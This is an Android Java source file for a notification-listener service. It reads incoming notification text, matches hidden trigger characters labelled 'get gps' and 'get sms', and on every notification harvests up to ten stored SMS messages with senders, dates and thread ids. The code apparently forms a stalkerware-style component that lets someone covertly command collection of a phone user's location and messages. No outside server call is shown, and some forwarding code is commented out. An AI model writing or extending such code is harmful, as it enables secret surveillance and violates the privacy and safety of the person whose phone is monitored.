package com.example.droidapp;

import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS;
import static android.provider.Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME;

import android.app.Activity;
import android.app.Notification;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.Manifest;

import androidx.annotation.RequiresApi;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/* Monitors Incoming Notifications */
public class INotifyService extends NotificationListenerService {
    public static interface Actions {
        String ON_NOTIFICATION_POSTED = "ON_NOTIFICATION_POSTED";
        String ON_NOTIFICATION_DISMISS = "ON_NOTIFICATION_DISMISS";
        String ON_NOTIFICATION_GRANTED = "ON_NOTIFICATION_GRANTED";
        String SEND_SMS_MSGS = "GET_ALL_SMS";
    }
    public static interface Triggers {
        String WHERE_YA_GOING = ";"; // get gps
        String WHAT_YA_DOING = "!"; // get sms
    }
    public static final String TAG = "INotifyService";
    public static boolean notificationGranted = false;
    public static final int ON_NOTIFY_REQUESTED_CODE = 222;
    public static final String[] permissions = new String[]{
            Manifest.permission.READ_SMS,
//            Manifest.permission.POST_NOTIFICATIONS,
    };
    public static final String[] actionFilters = Utils.getFieldNames(Actions.class).toArray(new String[0]);
    public static final List<String> triggerFilters = Utils.getFieldNames(Triggers.class);
    Intent intent = new Intent(Actions.ON_NOTIFICATION_POSTED);
    Boolean lastPost;
    public static String TRIGGER;
    public static int smsPrevCount;
    public static int smsMaxCount = 10;
    public static final String MODEL = "[title, text, type, time]";

    public static String[] note;
    public static String[] smsMsgs;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private String[] buildNotificationDTO(Notification notification){
        lastPost = true;
        String notyTpe = notification.category;
        String notificationTitle = notification.extras.getString("android.title");
        String notificationText = notification.extras.getString("android.text");
        String postTime = Utils.formatDate(notification.when);
        String TRIGGER_WORD = notificationText.toUpperCase(Locale.ROOT).replace(" ", "_");
        if(triggerFilters.contains(TRIGGER_WORD)) {
            TRIGGER = TRIGGER_WORD;
        }else{ TRIGGER = null; }

        String[] data = new String[]{notificationTitle, notificationText, notyTpe, postTime};
        return data;
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "notifier mounted " + notificationGranted);
    }

    public void setAllSmsMessages() {
        List<String> smsMessages = new ArrayList<>();
        try {
            // Uri for SMS content provider
            Uri uriSms = Uri.parse("content://sms");

            // Query the SMS content provider for all messages
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(uriSms, null, null, null, null);

            if (cursor != null && cursor.moveToFirst() && cursor.getCount() > smsPrevCount) {
                int indexBody = cursor.getColumnIndex("body");
                int indexAddress = cursor.getColumnIndex("address");
                int indexRecvdDate = cursor.getColumnIndex("date");
                int indexSndDate = cursor.getColumnIndex("date_sent");
                int indexThread = cursor.getColumnIndex("thread_id");
                int indexRead = cursor.getColumnIndex("read");
                do {
                    // Get the SMS message body and add it to the list
                    String body = cursor.getString(indexBody);
                    String phone = cursor.getString(indexAddress);
                    String recvd = cursor.getString(indexRecvdDate);
                    String snd = cursor.getString(indexSndDate);
                    String thrd = cursor.getString(indexThread);
                    Boolean read = cursor.getString(indexRead).equals("1");
                    String[] array = {body, phone, recvd, snd, read.toString(), thrd};
                    smsMessages.add(String.join(", ", array));
                    if(smsMessages.size()==smsMaxCount){
                        break;
                    }
                } while (cursor.moveToNext());
                smsPrevCount = cursor.getCount();
                cursor.close();
                smsMsgs = smsMessages.toArray(new String[0]);
//                intent.setAction(Actions.SEND_SMS_MSGS);
//                intent.putExtra("data", Utils.gson.toJson(smsMessages));

//                LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving SMS messages", e);
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if(lastPost!=null){ lastPost = null; return;} // prevents double posting java bug
        // Called when a new notification is posted
        Notification notification = sbn.getNotification();
        String[] note = buildNotificationDTO(sbn.getNotification());
        INotifyService.note = note;
        // Handle the notification as needed
        intent.setAction(Actions.ON_NOTIFICATION_POSTED);
//        intent.setAction(TRIGGER==null ? Actions.ON_NOTIFICATION_POSTED : TRIGGER);
//        intent.putExtra("data", Utils.gson.toJson(note));
        setAllSmsMessages();
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
        String msg = "Notification Posted: Package: " +", Title: " + note[0] + ", Text: " + note[1];
        Log.d(TAG, msg);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Called when a notification is removed
        String msg = "Notification removed: " + sbn.getPackageName();
        Log.d(TAG, msg);
        // Handle notification removal as needed
        intent.setAction(Actions.ON_NOTIFICATION_DISMISS);
        intent.putExtra("data", msg);
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
    }

    public static void requestNotificationPermissions(Activity activity) {
        if (notificationGranted || isNotificationsAllowed(activity)) return;
        Log.i(TAG, "requesting permissions");
        String componentName = activity.getPackageName() + "/" + INotifyService.class.getName();
        Intent notificationAccessSettings = new Intent(ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS);
        notificationAccessSettings.putExtra(EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME, componentName);
        activity.startActivityForResult(notificationAccessSettings, ON_NOTIFY_REQUESTED_CODE);
    }

    public static boolean isNotificationsAllowed(Activity activity) {
        ContentResolver contentResolver = activity.getContentResolver();
        String enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = activity.getPackageName();
        boolean isAllowed = !(enabledNotificationListeners == null || !enabledNotificationListeners.contains(packageName));
        INotifyService.notificationGranted = isAllowed;
        return isAllowed;
    }

}
